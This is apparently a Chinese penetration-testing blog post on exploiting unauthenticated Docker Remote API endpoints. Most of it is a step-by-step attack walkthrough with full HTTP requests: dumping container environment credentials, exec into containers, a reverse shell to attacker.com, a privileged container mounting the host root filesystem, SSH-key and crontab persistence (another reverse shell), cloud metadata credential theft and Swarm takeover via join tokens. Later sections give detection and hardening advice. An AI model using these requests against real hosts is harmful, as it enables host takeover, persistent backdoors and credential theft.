---
title: "Docker Remote API未授权访问打点与容器逃逸利用技术"
date: 2026-06-17T10:30:00+08:00
draft: false
weight: 79
description: "围绕 Docker Remote API（2375/2376）的攻击面，分析打点识别、容器与镜像枚举、exec 命令执行、特权容器逃逸、Swarm 集群接管、历史 CVE 链与蓝队处置思路。"
categories: ["安全", "渗透测试"]
tags: ["渗透测试", "漏洞利用", "管理面打点", "容器", "Docker", "容器逃逸", "Remote API"]
---

# Docker Remote API未授权访问打点与容器逃逸利用技术

`Docker Remote API` 是 Docker 守护进程（dockerd）对外暴露的 RESTful 管理接口。它不是普通的业务 API，而是直接控制 Docker 引擎全部能力的"上帝接口"——通过这套 API 可以完成与 `docker` CLI 完全等价的一切操作：

- 容器的创建、启动、停止、删除与 exec
- 镜像的拉取、构建、删除与推送
- 数据卷的创建、挂载与删除
- 网络的创建、连接与断开
- 系统信息、事件流与日志读取
- Swarm 集群管理与节点控制

对攻击者来说，Docker Remote API 未授权访问的价值不在于"一个端口开着"，而在于一旦该接口可被低信任网络直接触达且无认证保护，攻击者通常可以在极短时间内实现：

- 宿主机级别的任意命令执行（RCE）
- 宿主机文件系统完整读写
- 容器逃逸与宿主机接管
- 内网横向移动跳板构建
- 敏感数据（镜像层、环境变量、挂载卷）批量回收
- 在极端场景下接管整个 Swarm 集群

本文聚焦打点与利用侧，重点记录：

1. 如何识别当前目标是否为 Docker Remote API
2. 哪些端点最值得优先探测
3. 如何围绕容器、镜像、卷、网络建立资产画像
4. 如何通过 exec 与特权容器创建实现宿主机接管
5. 历史 CVE 链如何从 AuthZ 绕过直接打到容器逃逸
6. 蓝队如何从访问日志与守护进程日志识别这类打点

---

## 0. 攻击面概览

### 0.1 常见端口与路径

首轮至少应枚举：

- `2375/tcp` — HTTP 明文（非加密）
- `2376/tcp` — HTTPS（TLS 加密，生产环境）
- `/version` — 版本信息
- `/info` — 系统信息
- `/containers/json` — 容器列表
- `/containers/<id>/json` — 容器详情
- `/containers/<id>/logs` — 容器日志
- `/images/json` — 镜像列表
- `/volumes` — 卷列表
- `/networks` — 网络列表
- `/exec/<id>/start` — 执行命令
- `/containers/create` — 创建容器
- `/build` — 构建镜像
- `/system/events` — 事件流
- `/system/df` — 磁盘使用
- `/swarm` — Swarm 状态
- `/nodes` — Swarm 节点
- `/services` — Swarm 服务
- `/secrets` — Swarm 密钥

### 0.2 协议与认证边界

| 访问方式 | 端口 | 认证 |
|----------|------|------|
| HTTP 明文 | 2375 | 无认证（最危险） |
| HTTPS（仅加密） | 2376 | `--tls`，不校验客户端 |
| HTTPS + mTLS | 2376 | `--tlsverify`，校验客户端证书 |
| Unix Socket | — | 本地文件权限 |

Docker 官方文档明确指出，默认配置下 Docker Engine 不会启用认证；如果直接以 TCP 暴露且不加任何保护，任何能触达该端口的客户端都可以完全控制 Docker 引擎。

### 0.3 打点收益优先级

1. 确认目标为 Docker Remote API、版本号与运行模式
2. 枚举系统信息（`/info`）回收操作系统、内核版本、存储驱动
3. 枚举运行中的容器、镜像、卷与网络
4. 判断是否可通过 `/exec` 在容器内执行命令
5. 判断是否可通过创建新容器挂载宿主机根目录实现逃逸
6. 判断 Swarm 模式是否启用、集群节点与任务是否可枚举
7. 判断是否可拉取/构建镜像、读取 secrets 与管理敏感对象

---

## 1. 首轮识别：确认目标为 Docker Remote API

### 1.1 `/version` 端点

最轻量的识别入口。

```http
GET /version HTTP/1.1
Host: docker.target.example:2375
Accept: application/json
Connection: close
```

```json
{
  "Platform": {"Name": "Docker Engine - Community"},
  "Components": [
    {
      "Name": "Engine",
      "Version": "24.0.7",
      "Details": {
        "ApiVersion": "1.43",
        "MinAPIVersion": "1.12",
        "Os": "linux",
        "Arch": "amd64"
      }
    },
    {
      "Name": "containerd",
      "Version": "1.6.25"
    },
    {
      "Name": "runc",
      "Version": "1.1.9"
    }
  ],
  "Version": "24.0.7",
  "ApiVersion": "1.43",
  "KernelVersion": "5.15.0-91-generic",
  "Os": "linux",
  "Arch": "amd64"
}
```

直接回收：

- Docker Engine 版本
- API 版本与最低兼容版本
- 操作系统与架构
- 内核版本
- containerd 与 runc 版本

### 1.2 `/info` 端点

信息密度最高的单点接口。

```http
GET /info HTTP/1.1
Host: docker.target.example:2375
Accept: application/json
Connection: close
```

```json
{
  "Containers": 12,
  "ContainersRunning": 8,
  "ContainersStopped": 4,
  "Images": 23,
  "Driver": "overlay2",
  "KernelVersion": "5.15.0-91-generic",
  "OperatingSystem": "Ubuntu 22.04.3 LTS",
  "OSType": "linux",
  "Architecture": "x86_64",
  "NCPU": 4,
  "MemTotal": 8345673728,
  "DockerRootDir": "/var/lib/docker",
  "Name": "prod-docker-host-01",
  "Labels": ["environment=production", "team=devops"],
  "ServerVersion": "24.0.7",
  "Swarm": {
    "LocalNodeState": "inactive"
  },
  "SecurityOptions": [
    "name=apparmor",
    "name=seccomp",
    "profile=builtin"
  ],
  "Warnings": [
    "WARNING: API is accessible on remote access without encryption"
  ]
}
```

一次性暴露：

- 主机名（`Name`）
- 操作系统与内核版本
- CPU 核数与总内存
- 运行/停止容器数量
- 镜像总数
- 存储驱动
- Docker 根目录
- Swarm 状态
- 安全配置
- **关键告警**：`Warnings` 直接提示 API 无加密远程访问

### 1.3 TLS 状态判断

- `http://host:2375/version` 直接返回 JSON → 完全无认证，风险最高
- `https://host:2376/version` 返回证书错误 → 启用了 HTTPS
- 握手后返回 `tls: bad certificate` → 启用了 `--tlsverify`（mTLS）
- 握手成功但返回 `403` → TLS 通过但存在应用层认证

---

## 2. 容器与镜像枚举

### 2.1 容器列表

```http
GET /containers/json?all=true HTTP/1.1
Host: docker.target.example:2375
Accept: application/json
Connection: close
```

```json
[
  {
    "Id": "a1b2c3d4e5f6...",
    "Names": ["/payment-api"],
    "Image": "registry.internal.com/payment-api:v2.3.1",
    "Command": "/usr/bin/java -jar /app/payment-api.jar",
    "Ports": [
      {"IP": "0.0.0.0", "PrivatePort": 8080, "PublicPort": 8080, "Type": "tcp"}
    ],
    "Labels": {"environment": "production"},
    "State": "running",
    "Status": "Up 3 days",
    "NetworkSettings": {
      "Networks": {"payment_net": {"IPAddress": "172.18.0.3"}}
    },
    "Mounts": [
      {"Type": "bind", "Source": "/opt/payment/config", "Destination": "/app/config", "Mode": "ro"}
    ]
  }
]
```

直接暴露容器名称、镜像、启动命令、端口映射、挂载点、网络配置。

### 2.2 容器详情（高价值）

```http
GET /containers/a1b2c3d4e5f6/json HTTP/1.1
Host: docker.target.example:2375
Accept: application/json
Connection: close
```

```json
{
  "Config": {
    "Env": [
      "DATABASE_URL=postgresql://payment_user:S3cur3P@ss@10.20.30.50:5432/payment_db",
      "REDIS_URL=redis://10.20.30.51:6379/0",
      "JWT_SECRET=a8f5f167f44f4964e6c998dee827110c",
      "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE",
      "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    ],
    "Image": "registry.internal.com/payment-api:v2.3.1",
    "Cmd": ["/usr/bin/java", "-jar", "/app/payment-api.jar"]
  },
  "HostConfig": {
    "Binds": [
      "/opt/payment/config:/app/config:ro",
      "/var/run/docker.sock:/var/run/docker.sock"
    ],
    "Privileged": false,
    "CapAdd": ["SYS_ADMIN"],
    "NetworkMode": "payment_net"
  }
}
```

容器详情的价值远超列表接口，因为它额外暴露：

- **环境变量中的敏感信息**：数据库连接串、密码、API Key、云凭据、JWT Secret
- **挂载详情**：是否挂载了 `docker.sock`、`/etc`、`/proc` 等危险路径
- **特权配置**：`Privileged`、`CapAdd`、`SecurityOpt`
- **内部服务地址**

### 2.3 容器日志

```http
GET /containers/a1b2c3d4e5f6/logs?stdout=true&stderr=true&tail=100 HTTP/1.1
Host: docker.target.example:2375
Connection: close
```

```text
2026-06-17 08:11:32 INFO  [payment-api] Connected to database: postgresql://10.20.30.50:5432/payment_db
2026-06-17 08:11:32 WARN  [payment-api] Retry attempt for transaction tx_8f3a2b: timeout connecting to 10.20.30.52:443
2026-06-17 08:11:33 ERROR [payment-api] Failed to send webhook to https://merchant.example.com/callback: Connection refused
```

日志中可能回收内部服务地址、数据库连接信息、第三方服务 URL、错误堆栈。

### 2.4 镜像列表

```http
GET /images/json?all=true HTTP/1.1
Host: docker.target.example:2375
Accept: application/json
Connection: close
```

```json
[
  {
    "Id": "sha256:e3b0c44298fc1c14...",
    "RepoTags": [
      "registry.internal.com/payment-api:v2.3.1",
      "registry.internal.com/payment-api:latest"
    ],
    "Size": 458293760,
    "Labels": {"maintainer": "devops@target.com", "version": "2.3.1"}
  }
]
```

识别内部镜像仓库地址、应用版本、运维人员标签。

---

## 3. 卷、网络与系统级信息

### 3.1 卷列表

```http
GET /volumes HTTP/1.1
Host: docker.target.example:2375
Accept: application/json
Connection: close
```

```json
{
  "Volumes": [
    {
      "Name": "payment_db_data",
      "Driver": "local",
      "Mountpoint": "/var/lib/docker/volumes/payment_db_data/_data",
      "Labels": {"com.docker.compose.project": "payment"}
    }
  ]
}
```

### 3.2 网络列表

```http
GET /networks HTTP/1.1
Host: docker.target.example:2375
Accept: application/json
Connection: close
```

```json
[
  {
    "Name": "bridge",
    "Driver": "bridge",
    "IPAM": {"Config": [{"Subnet": "172.17.0.0/16", "Gateway": "172.17.0.1"}]},
    "Containers": {
      "a1b2c3d4e5f6...": {"Name": "payment-api", "IPv4Address": "172.17.0.2/16"}
    }
  }
]
```

暴露网络拓扑、容器 IP 映射关系。

### 3.3 事件流

```http
GET /events?since=1718600000&until=1718603600 HTTP/1.1
Host: docker.target.example:2375
Accept: application/json
Connection: close
```

```json
{"status":"start","id":"a1b2c3d4e5f6...","from":"registry.internal.com/payment-api:v2.3.1","Type":"container","Action":"start","Actor":{"Attributes":{"name":"payment-api"}},"time":1718600100}
```

实时观察容器的创建、启动、停止、销毁行为。

---

## 4. 容器内命令执行（exec）

### 4.1 创建 exec 实例

```http
POST /containers/a1b2c3d4e5f6/exec HTTP/1.1
Host: docker.target.example:2375
Content-Type: application/json
Connection: close

{
  "AttachStdin": false,
  "AttachStdout": true,
  "AttachStderr": true,
  "Tty": true,
  "Cmd": ["id", "&&", "cat", "/etc/hostname", "&&", "ip", "addr"]
}
```

```json
{"Id": "exec_instance_id_abc123"}
```

### 4.2 启动 exec 实例

```http
POST /exec/exec_instance_id_abc123/start HTTP/1.1
Host: docker.target.example:2375
Content-Type: application/json
Connection: close

{
  "Detach": false,
  "Tty": true
}
```

```text
uid=0(root) gid=0(root) groups=0(root)
payment-api
eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 172.18.0.3/16 brd 172.18.255.255 scope global eth0
```

### 4.3 反弹 Shell

```http
POST /containers/a1b2c3d4e5f6/exec HTTP/1.1
Host: docker.target.example:2375
Content-Type: application/json
Connection: close

{
  "AttachStdout": true,
  "Tty": true,
  "Cmd": ["/bin/bash", "-c", "bash -i >& /dev/tcp/attacker.com/4444 0>&1"]
}
```

### 4.4 exec 的上下文风险

exec 运行在容器上下文中。如果容器存在以下配置，exec 价值进一步放大：

- `--privileged` → exec 内可直接访问宿主机设备
- 挂载了 `/var/run/docker.sock` → exec 内可通过 socket 控制宿主机 Docker
- 挂载了宿主机 `/etc` → exec 内可直接修改宿主机配置
- `NetworkMode: host` → exec 内直接处于宿主机网络命名空间

---

## 5. 容器创建与宿主机接管

### 5.1 挂载宿主机根目录

这是 Docker Remote API 未授权访问最致命的利用方式。攻击者直接创建一个挂载宿主机根目录的特权容器。

```http
POST /containers/create?name=backdoor HTTP/1.1
Host: docker.target.example:2375
Content-Type: application/json
Connection: close

{
  "Image": "alpine:latest",
  "Cmd": ["sleep", "infinity"],
  "HostConfig": {
    "Binds": ["/:/host:rw"],
    "Privileged": true,
    "NetworkMode": "host",
    "PidMode": "host"
  }
}
```

```json
{"Id": "new_container_id_xyz789", "Warnings": []}
```

启动容器：

```http
POST /containers/new_container_id_xyz789/start HTTP/1.1
Host: docker.target.example:2375
Connection: close
```

在新容器内执行命令：

```http
POST /containers/new_container_id_xyz789/exec HTTP/1.1
Host: docker.target.example:2375
Content-Type: application/json
Connection: close

{
  "AttachStdout": true,
  "Tty": true,
  "Cmd": ["cat", "/host/etc/shadow"]
}
```

```text
root:$6$rounds=656000$...:19531:0:99999:7:::
daemon:*:19123:0:99999:7:::
```

利用成功后意味着：

- 宿主机文件系统完全可读可写
- 可读取 `/etc/shadow` 获取系统用户密码哈希
- 可向 `/host/etc/crontab` 或 `/host/root/.ssh/authorized_keys` 写入持久化后门
- 可通过 `chroot /host` 直接切换到宿主机根环境
- `Privileged: true` → 可访问宿主机所有设备
- `NetworkMode: host` → 直接使用宿主机网络
- `PidMode: host` → 可看到宿主机所有进程

### 5.2 SSH 持久化

```http
POST /containers/new_container_id_xyz789/exec HTTP/1.1
Host: docker.target.example:2375
Content-Type: application/json
Connection: close

{
  "AttachStdout": true,
  "Tty": true,
  "Cmd": ["sh", "-c", "mkdir -p /host/root/.ssh && echo 'ssh-rsa AAAA... attacker@key' >> /host/root/.ssh/authorized_keys && chmod 600 /host/root/.ssh/authorized_keys"]
}
```

### 5.3 Crontab 持久化

```http
POST /containers/new_container_id_xyz789/exec HTTP/1.1
Host: docker.target.example:2375
Content-Type: application/json
Connection: close

{
  "AttachStdout": true,
  "Tty": true,
  "Cmd": ["sh", "-c", "echo '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/attacker.com/4444 0>&1\"' >> /host/etc/crontab"]
}
```

### 5.4 内网横向跳板

利用 `NetworkMode: host` 创建的容器直接处于宿主机网络中：

- 扫描宿主机内网网段
- 访问仅监听 `127.0.0.1` 的服务
- 访问云环境元数据服务（`169.254.169.254`）

```http
POST /containers/new_container_id_xyz789/exec HTTP/1.1
Host: docker.target.example:2375
Content-Type: application/json
Connection: close

{
  "AttachStdout": true,
  "Tty": true,
  "Cmd": ["curl", "-s", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"]
}
```

### 5.5 镜像层敏感数据提取

```http
GET /images/registry.internal.com/payment-api:v2.3.1/get HTTP/1.1
Host: docker.target.example:2375
Connection: close
```

导出镜像 tar 包，离线分析镜像层中可能包含的硬编码配置、`.env` 文件、SSH 私钥、源代码、CI/CD 凭据。

---

## 6. Swarm 集群与敏感对象

### 6.1 Swarm 状态与 Join Token

```http
GET /swarm HTTP/1.1
Host: docker.target.example:2375
Accept: application/json
Connection: close
```

```json
{
  "ID": "swarm_id_abc123",
  "Spec": {
    "Name": "prod-swarm",
    "Labels": {"environment": "production"}
  },
  "JoinTokens": {
    "Worker": "SWMTKN-1-3pu6s0x5y7z8a9b1c2d3e4f5g6h7i8j9k0l1m2n3o4p5q6r7s8-abc123def456",
    "Manager": "SWMTKN-1-3pu6s0x5y7z8a9b1c2d3e4f5g6h7i8j9k0l1m2n3o4p5q6r7s8-mgr789xyz012"
  }
}
```

Join Token 直接暴露后，攻击者可以将恶意节点加入 Swarm 集群。以 Manager 身份加入后可控制整个集群。

### 6.2 Swarm 节点

```http
GET /nodes HTTP/1.1
Host: docker.target.example:2375
Accept: application/json
Connection: close
```

```json
[
  {
    "Description": {"Hostname": "swarm-manager-01", "Platform": {"OS": "linux"}},
    "Status": {"State": "ready", "Addr": "10.20.30.10"},
    "ManagerStatus": {"Leader": true, "Reachability": "reachable", "Addr": "10.20.30.10:2377"}
  },
  {
    "Description": {"Hostname": "swarm-worker-01"},
    "Status": {"State": "ready", "Addr": "10.20.30.11"}
  }
]
```

### 6.3 Swarm 服务与 Secrets

```http
GET /services HTTP/1.1
Host: docker.target.example:2375
Accept: application/json
Connection: close
```

```json
[
  {
    "Spec": {
      "Name": "payment-api",
      "TaskTemplate": {
        "ContainerSpec": {
          "Image": "registry.internal.com/payment-api:v2.3.1",
          "Env": ["DATABASE_URL=postgresql://payment_user:S3cur3P@ss@10.20.30.50:5432/payment_db"],
          "Secrets": [{"SecretName": "payment_db_password"}]
        }
      }
    }
  }
]
```

```http
GET /secrets HTTP/1.1
Host: docker.target.example:2375
Accept: application/json
Connection: close
```

```json
[
  {"ID": "secret_id_xyz", "Spec": {"Name": "payment_db_password"}},
  {"ID": "secret_id_abc", "Spec": {"Name": "tls_private_key"}}
}
```

Swarm API 默认只返回 secret 元数据，但攻击者可以通过创建引用该 secret 的服务，在容器内读取 `/run/secrets/<secret_name>` 获取实际值。

---

## 7. 历史 CVE 与风险链

### 7.1 CVE-2024-41110：AuthZ 插件绕过

- **影响版本**：Docker Engine 26.x 之前（AuthZ 插件场景）
- **CVSS**：10.0（Critical）
- **核心问题**：AuthZ 插件的 HTTP 头解析与 Docker Engine 存在不一致，攻击者可通过构造超大 HTTP 头绕过授权检查
- **利用条件**：需要网络可达 Docker API
- **影响**：绕过 AuthZ 插件直接调用全部 API，等价于未授权访问

### 7.2 CVE-2024-21626：runc 容器逃逸

- **影响版本**：runc 1.1.12 之前
- **CVSS**：8.6（High）
- **核心问题**：runc 在容器创建过程中存在文件描述符泄露，攻击者可通过 `WORKDIR` 指令逃逸到宿主机
- **利用条件**：需要能构建或运行恶意镜像
- **影响**：容器逃逸，宿主机文件系统读写

### 7.3 CVE-2024-29018：BuildKit 沙箱逃逸

- **影响版本**：Docker buildx / BuildKit 受影响版本
- **CVSS**：8.0+（High）
- **核心问题**：`docker build` 过程中 BuildKit 沙箱存在逃逸
- **利用条件**：需要能触发镜像构建
- **影响**：在构建过程中逃逸到宿主机

### 7.4 综合风险链

```
端口扫描 → :2375 HTTP 明文 / :2376 HTTPS
         ↓
/version + /info → 系统画像（版本、OS、内核、Swarm 状态）
         ↓
/containers/json → 全量容器列表（名称、镜像、端口、挂载）
         ↓
/containers/<id>/json → 环境变量中的数据库密码、云凭据、JWT Secret
         ↓
/containers/<id>/exec → 在容器内执行命令
         ↓
/containers/create + Binds: ["/:/host:rw"] + Privileged: true → 宿主机接管
         ↓
写入 /host/root/.ssh/authorized_keys → SSH 持久化
写入 /host/etc/crontab → 定时任务持久化
         ↓
/swarm → Join Token 泄露 → Swarm 集群接管
         ↓
/secrets + /services → 获取所有 Swarm 密钥与服务配置
```

---

## 8. 蓝队视角：日志痕迹与防守

### 8.1 关键日志源

**Docker 守护进程日志**：

```text
Jun 17 10:12:01 prod-docker-host-01 dockerd[1234]: time="2026-06-17T10:12:01.445Z" level=info msg="API POST /containers/create"
Jun 17 10:12:02 prod-docker-host-01 dockerd[1234]: time="2026-06-17T10:12:02.112Z" level=info msg="API POST /containers/backdoor/start"
Jun 17 10:12:05 prod-docker-host-01 dockerd[1234]: time="2026-06-17T10:12:05.789Z" level=info msg="API POST /containers/backdoor/exec"
```

**TLS 握手失败**：

```text
Jun 17 10:11:32 prod-docker-host-01 dockerd[1234]: time="2026-06-17T10:11:32.445Z" level=warning msg="rejected connection from 10.10.10.21" error="tls: client didn't provide a certificate"
```

### 8.2 高告警指标

| 行为 | 日志特征 | 告警级别 |
|------|----------|----------|
| `/version` + `/info` 连续访问 | 短时间内多次 GET | 高 |
| 容器详情枚举 | `/containers/<id>/json` 批量请求 | 高 |
| exec 实例创建 | `POST /containers/<id>/exec` | 严重 |
| 特权容器创建 | `POST /containers/create` + `Privileged: true` | 严重 |
| 宿主机目录挂载 | `Binds` 包含 `/:/host` | 严重 |
| Swarm Join Token 读取 | `GET /swarm` | 严重 |
| 镜像导出 | `GET /images/<name>/get` | 高 |
| 非预期来源的 API 访问 | 外部 IP 访问 2375/2376 | 严重 |

### 8.3 宿主机层面异常检测

```bash
docker ps -a --format "table {{.ID}}\t{{.Names}}\t{{.Image}}\t{{.CreatedAt}}" | head -20

docker inspect $(docker ps -aq) --format '{{.Name}}: {{json .HostConfig.Binds}}' | grep -v "null"

docker inspect $(docker ps -aq) --format '{{.Name}}: Privileged={{.HostConfig.Privileged}}' | grep "true"

docker inspect $(docker ps -aq) --format '{{.Name}}: NetworkMode={{.HostConfig.NetworkMode}}' | grep "host"

ls -la /root/.ssh/authorized_keys
stat /root/.ssh/authorized_keys
```

### 8.4 网络层防护

- 永远不要将 Docker API 以明文 HTTP 暴露到非受信网络
- 生产环境必须使用 mTLS（`--tlsverify`）
- `2375`、`2376`、`2377` 端口纳入资产监控
- 使用反向代理时强制认证与 IP 白名单
- 对容器创建事件建立告警（尤其是带 `Binds`、`Privileged`、`PidMode`、`NetworkMode` 参数的）

### 8.5 配置加固

- 生产环境必须启用 `--tlsverify` + `--tlscacert` + `--tlscert` + `--tlskey`
- 定期轮换 TLS 证书与 Swarm Join Token
- 将 Docker API 端口从公网收敛到管理网段
- 对 CI/CD 节点上的 Docker 配置执行最小权限治理
- 使用 Docker Content Trust 防止未授权镜像运行
- 定期审计 Swarm secrets 与服务配置

---

## 9. 审查清单

| 检查项 | 说明 |
|--------|------|
| 2375 端口是否对外暴露 | 确认 HTTP 明文 API 可达范围 |
| 2376 端口认证方式 | 确认是 `--tls` 还是 `--tlsverify` |
| 2377 端口是否受限 | Swarm 集群通信端口 |
| 是否存在未知容器 | `docker ps -a` 检查 |
| 是否存在特权容器 | 检查 `Privileged: true` |
| 是否存在宿主机目录挂载 | 检查 `Binds` 包含 `/` |
| SSH 密钥是否被篡改 | 检查 `/root/.ssh/authorized_keys` |
| crontab 是否被篡改 | 检查 `/etc/crontab` |
| Swarm Join Token 是否泄露 | 检查 `/swarm` 接口可达性 |
| 容器环境变量是否包含敏感信息 | 检查 `DATABASE_URL`、`AWS_*` 等 |
| 是否启用 Docker Content Trust | 防止未授权镜像 |
| TLS 证书是否定期轮换 | 检查证书有效期 |

---

## 10. 总结

Docker Remote API 的攻击面价值在于它直接等价于 Docker Engine 的完全控制权。未授权访问 Docker API 几乎等同于拿到了宿主机的 root 权限。

从攻击者视角看，最高效的路径是：

1. 通过 `/version` 和 `/info` 确认目标并建立系统画像
2. 通过 `/containers/json` 和 `/containers/<id>/json` 枚举全部容器与环境变量凭据
3. 通过 `/exec` 在容器内执行命令
4. 通过 `/containers/create` 创建特权容器挂载宿主机根目录，实现宿主机接管
5. 写入 SSH 公钥或 crontab 实现持久化
6. 通过 `/swarm` 获取 Join Token 接管整个 Swarm 集群
7. 通过 `/secrets` 和 `/services` 获取所有密钥与服务配置

从防守视角看，核心措施是：

1. 永远不要将 Docker API 以明文 HTTP 暴露到非受信网络
2. 生产环境必须使用 mTLS（`--tlsverify`）
3. 收敛 2375/2376/2377 端口的网络暴露范围
4. 对容器创建事件建立告警
5. 定期轮换 TLS 证书与 Swarm Join Token
6. 定期审计容器配置与宿主机文件系统完整性
